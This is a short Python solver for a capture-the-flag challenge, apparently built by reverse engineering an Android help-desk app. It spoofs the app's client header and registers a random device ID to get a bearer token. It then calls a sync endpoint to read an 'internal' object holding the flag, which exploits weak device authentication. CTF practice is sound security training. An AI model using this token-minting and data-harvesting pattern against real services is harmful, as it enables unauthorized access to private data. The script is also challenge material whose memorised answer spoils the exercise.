#!/usr/bin/env python3
"""
Deskline CTF Solver
Reverse engineered from deskline-1.6.0.apk
Endpoint: https://web-7b7730bbddb3fcb6.web.h7tex.com
"""

import sys
import uuid
import requests

def solve(base_url="https://web-7b7730bbddb3fcb6.web.h7tex.com"):
    # 1. Device authentication
    device_id = f"dsk-{uuid.uuid4()}"
    headers = {
        "X-Deskline-Client": "Deskline-Android/1.6.0",
        "Content-Type": "application/json"
    }
    auth_resp = requests.post(
        f"{base_url}/api/v1/auth/device",
        json={"device_id": device_id},
        headers=headers,
        timeout=10
    )
    if auth_resp.status_code != 200:
        print(f"[-] Auth failed: {auth_resp.status_code} {auth_resp.text}", file=sys.stderr)
        sys.exit(1)
        
    data = auth_resp.json()
    token = data.get("token")
    if not token:
        print("[-] No token received", file=sys.stderr)
        sys.exit(1)
        
    # 2. Sync queue to get tickets and internal notes
    sync_headers = {
        "Authorization": f"Bearer {token}"
    }
    sync_resp = requests.get(
        f"{base_url}/api/v1/sync",
        headers=sync_headers,
        timeout=10
    )
    if sync_resp.status_code != 200:
        print(f"[-] Sync failed: {sync_resp.status_code} {sync_resp.text}", file=sys.stderr)
        sys.exit(1)
        
    sync_data = sync_resp.json()
    flag = sync_data.get("internal", {}).get("value")
    if flag:
        print(flag)
        return flag
    else:
        print("[-] Flag not found in internal object", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "https://web-7b7730bbddb3fcb6.web.h7tex.com"
    solve(url)
